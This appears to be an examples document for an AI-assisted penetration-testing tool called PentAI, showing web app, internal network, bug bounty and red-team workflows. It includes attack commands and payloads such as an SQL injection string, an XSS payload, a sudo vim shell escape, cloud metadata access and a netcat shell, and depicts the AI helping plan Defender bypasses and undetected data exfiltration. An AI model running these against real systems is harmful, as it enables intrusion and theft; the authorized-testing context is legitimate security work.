# PentAI TUI - Practical Examples

## Real-World Usage Scenarios

### Scenario 1: Web Application Pentest

#### Setup
```bash
# Create target
pentai --init-target acmecorp-webapp

# Edit config
cat > ~/.config/pentai/targets/acmecorp-webapp.json << EOF
{
  "name": "acmecorp-webapp",
  "scope": "https://app.acmecorp.com, 203.0.113.0/24",
  "notes": "Web app pentest, Q1 2024. Auth provided: test:test123",
  "loot_paths": ["/home/user/pentests/acmecorp/logs"],
  "tags": ["webapp", "authenticated", "production"],
  "hosts": ["app.acmecorp.com", "203.0.113.45"],
  "credentials": {
    "test_account": "test:test123"
  },
  "findings": []
}
EOF

# Set as current target
echo "acmecorp-webapp" > .pentai-target
```

#### Discovery Phase
```bash
# Initial OSINT
pentai --mode osint
> "Enumerate subdomains and technologies for acmecorp.com"
AI: [Suggests tools: subfinder, httpx, whatweb, wappalyzer]

# Run suggested commands
subfinder -d acmecorp.com -o subs.txt
httpx -l subs.txt -tech-detect -o tech.txt

# Analyze results
pentai --mode recon --file tech.txt
> "Based on this tech stack, what should I test?"
AI: [Identifies React frontend, Node.js backend, suggests attack vectors]
```

#### Vulnerability Assessment
```bash
# Directory enumeration completed
pentai --mode cmd --file dirsearch-output.txt
> "Found /admin, /api/v1, /.git - what are the risks?"
AI: [Explains each finding, suggests verification commands]

# Found interesting endpoint
pentai --mode exploit
> "API endpoint /api/v1/users accepts POST with user_id param. 
   Response includes full user objects. Possible IDOR?"
AI: [Explains IDOR, provides test payloads, suggests automation]
```

#### Exploitation
```bash
# SQLi suspected
pentai --mode exploit --prefill "SQLi in login form parameter"
> "Testing username parameter: admin' OR '1'='1
   Results in error: MySQL syntax error near..."
AI: [Confirms SQLi, suggests sqlmap usage, manual exploitation techniques]

# Run exploit
sqlmap -u "https://app.acmecorp.com/login" --data "user=test&pass=test" -p user --batch

# Analyze sqlmap output
pentai --mode loot --file sqlmap-output.txt
> "Extract interesting data"
AI: [Identifies dumped passwords, admin accounts, sensitive tables]
```

#### Post-Exploitation
```bash
# Got shell access
pentai --mode privesc
> "Current user: www-data on Ubuntu 20.04
   sudo -l shows: (ALL) NOPASSWD: /usr/bin/vim"
AI: [Identifies GTFOBins vim privesc: sudo vim -c ':!/bin/sh']

# Check for additional vectors
pentai --mode privesc --file linpeas.txt
AI: [Analyzes output, prioritizes vectors, suggests exploitation order]
```

#### Reporting
```bash
# End of engagement
pentai --mode report --target acmecorp-webapp
> "Generate final report summary"
AI: [Creates structured report with findings, risks, recommendations]

# Export session
pentai --view-logs --target acmecorp-webapp --last 100 > acmecorp-full-session.txt
```

---

### Scenario 2: Internal Network Pentest

#### Setup
```bash
mkdir -p ~/pentests/internal-2024/nmap
cd ~/pentests/internal-2024

pentai --init-target internal-net
echo "internal-net" > .pentai-target
```

#### Initial Reconnaissance
```bash
# Network sweep
nmap -sn 10.10.10.0/24 -oA nmap/sweep

# Port scan discovered hosts
nmap -sS -sV -sC -p- -oA nmap/full-scan 10.10.10.1-50

# Analyze with PentAI
pentai --mode recon --file nmap/full-scan.nmap
> "Prioritize targets and suggest enumeration"
AI: [Analyzes open ports, suggests service-specific enumeration]
```

#### SMB Enumeration
```bash
# SMB shares discovered
pentai --mode recon
> "Found SMB on 10.10.10.15, 10.10.10.20. What tools should I use?"
AI: [Suggests: enum4linux, smbclient, smbmap, CrackMapExec]

# Run enumeration
enum4linux -a 10.10.10.15 > enum4linux.txt

# Analyze results
pentai --mode loot --file enum4linux.txt
> "Find interesting shares and users"
AI: [Identifies writable shares, user lists, null session access]
```

#### Active Directory Attack
```bash
# Credentials obtained
pentai --mode red --target internal-net
> "Credentials: user1:Password123. Domain: CORP.LOCAL. 
   Plan attack to domain admin."
AI: [Suggests attack path: Kerberoasting → lateral movement → DCSync]

# Execute plan
pentai --mode exploit
> "How do I perform Kerberoasting?"
AI: [Explains technique, provides Rubeus and Impacket commands]
```

---

### Scenario 3: Bug Bounty Hunting

#### Target Selection
```bash
pentai --mode osint
> "Starting bug bounty on example.com. What's the methodology?"
AI: [Outlines reconnaissance → vulnerability discovery → exploitation → reporting]
```

#### Subdomain Enumeration
```bash
# Mass subdomain discovery
amass enum -d example.com -o amass-subs.txt

pentai --mode recon --file amass-subs.txt
> "Found 450 subdomains. How to prioritize?"
AI: [Suggests filtering by HTTP status, technology, interesting keywords]

# Apply filters
cat amass-subs.txt | httpx -follow-redirects -status-code -title -tech-detect -o live.txt

pentai --mode recon --file live.txt
> "Analyze tech stack and suggest targets"
AI: [Identifies outdated frameworks, custom apps, interesting endpoints]
```

#### XSS Hunting
```bash
pentai --mode exploit
> "Testing XSS on search parameter. WAF blocks <script>. How to bypass?"
AI: [Provides bypass techniques: encoding, alternative tags, events]

# Found XSS
pentai --mode exploit
> "XSS works: /search?q=<img src=x onerror=alert(1)>
   How to escalate impact?"
AI: [Suggests: cookie stealing, BeEF, stored XSS, DOM manipulation]
```

#### SSRF Exploitation
```bash
pentai --mode exploit
> "URL parameter vulnerable to SSRF. Can access http://127.0.0.1.
   Internal services exposed?"
AI: [Explains common internal ports, cloud metadata endpoints, exploitation chains]

# Test cloud metadata
pentai --mode exploit
> "SSRF works on AWS. Accessed http://169.254.169.254/latest/meta-data/
   Got IAM credentials. What next?"
AI: [Explains AWS enumeration, privilege escalation, persistence]
```

---

### Scenario 4: Red Team Engagement

#### Planning Phase
```bash
pentai --init-target redteam-corp --force
cat > ~/.config/pentai/targets/redteam-corp.json << EOF
{
  "name": "redteam-corp",
  "scope": "Full scope: corp.example.com, 192.168.0.0/16",
  "notes": "Red team exercise. Duration: 2 weeks. Rules: No DoS, no data destruction",
  "tags": ["redteam", "full-scope", "active-defense"],
  "hosts": [],
  "credentials": {},
  "findings": []
}
EOF
```

#### Initial Access Planning
```bash
pentai --mode red --target redteam-corp
> "Plan initial access via phishing campaign"
AI: [Outlines: reconnaissance → pretext development → payload creation → delivery → C2 setup]

pentai --mode exploit
> "Create Office macro payload that bypasses Windows Defender"
AI: [Suggests obfuscation techniques, AMSI bypass, stageless vs staged payloads]
```

#### Lateral Movement
```bash
pentai --mode red
> "Compromised workstation: WIN-USER01. Domain: CORP.
   Plan lateral movement to domain controller."
AI: [Attack path: credential dumping → SMB relay → pass-the-hash → golden ticket]

# Each step
pentai --mode privesc
> "Dump credentials from WIN-USER01"
AI: [Suggests: Mimikatz, ProcDump+Mimikatz, Nanodump, shadow copies]

pentai --mode exploit
> "Got hash: Administrator:500:aad3...:31d6...
   Use pass-the-hash to access DC?"
AI: [Explains PTH, provides Impacket commands, CrackMapExec usage]
```

#### Persistence & Exfiltration
```bash
pentai --mode red
> "Established domain admin access. Plan persistence mechanisms."
AI: [Suggests: golden ticket, skeleton key, scheduled tasks, WMI subscriptions]

pentai --mode red
> "Exfiltrate 50GB data without detection. What's the approach?"
AI: [Discusses: chunking, encryption, steganography, protocol tunneling, timing]
```

---

### Scenario 5: Command Troubleshooting

#### Nmap Issues
```bash
pentai --mode cmd
> "nmap -sS 10.0.0.1 returns: You requested a scan type which requires root privileges."
AI: [Explains: SYN scan needs raw sockets, suggests: sudo or -sT for unprivileged]

pentai --mode cmd
> "Nmap very slow on network. Command: nmap -p- 10.0.0.0/24"
AI: [Identifies: scanning entire subnet with all ports, suggests: -T4, --min-rate, targeted ports]
```

#### SQLMap Problems
```bash
pentai --mode cmd --prefill "sqlmap error"
> "sqlmap -u http://target.com?id=1 returns: all tested parameters do not appear to be injectable"
AI: [Suggests: check --level and --risk, try different techniques, verify vulnerable parameter]
```

#### Metasploit Issues
```bash
pentai --mode cmd
> "msfconsole module exploit/windows/smb/ms17_010_eternalblue fails with:
   Exploit completed, but no session was created."
AI: [Explains common causes: firewall, wrong target, incorrect payload, suggests troubleshooting]
```

---

### Scenario 6: Learning & Education

#### Understanding Concepts
```bash
pentai --mode chat
> "Explain the difference between SAST and DAST"
AI: [Detailed explanation with examples, use cases, pros/cons]

pentai --mode chat
> "What is a reverse shell and how does it work?"
AI: [Explains concept, provides examples in bash/python/powershell, discusses detection]
```

#### Tool Learning
```bash
pentai --mode chat
> "Teach me how to use Burp Suite for API testing"
AI: [Step-by-step guide: setup → proxy config → intercepting → repeater → automation]

pentai --mode chat
> "What are the key Bloodhound queries for AD pentesting?"
AI: [Lists queries, explains what each reveals, suggests attack paths]
```

#### Certification Prep
```bash
pentai --mode chat
> "OSCP exam tips for privilege escalation"
AI: [Strategies, common vectors, tools, enumeration scripts, methodology]

pentai --mode exploit
> "Practice scenario: Linux box with SUID bash binary. How to exploit?"
AI: [Explains SUID exploitation, bash -p, provides commands]
```

---

## Quick Reference Commands

### Daily Workflow
```bash
# Start of day - check target status
pentai --mode report --target current-project

# During recon phase
pentai --mode recon --file latest-scan.xml

# Found creds - analyze
pentai --mode loot --file burp-results.txt

# Need to escalate
pentai --mode privesc --file enum-output.txt

# End of day - document
pentai --mode report
pentai --view-logs --last 50 > daily-notes-$(date +%F).txt
```

### Error Resolution
```bash
# Command failed
[run command] 2>&1 | tee error.log
pentai --mode cmd --file error.log

# Tool not working
pentai --mode cmd --prefill "[paste tool output]"
```

### Quick Lookups
```bash
# Explain command
pentai --mode cmd --prefill "nc -nvlp 4444 -e /bin/bash"

# Get command suggestion
pentai --mode exploit --prefill "reverse shell from Windows"
```

### Integration Examples
```bash
# Analyze current command
alias paic='fc -ln -1 | xargs -I{} pentai --mode cmd --prefill "{}"'

# Quick recon on file
alias pair='pentai --mode recon --file'

# Loot hunting
alias pail='pentai --mode loot --file'
```
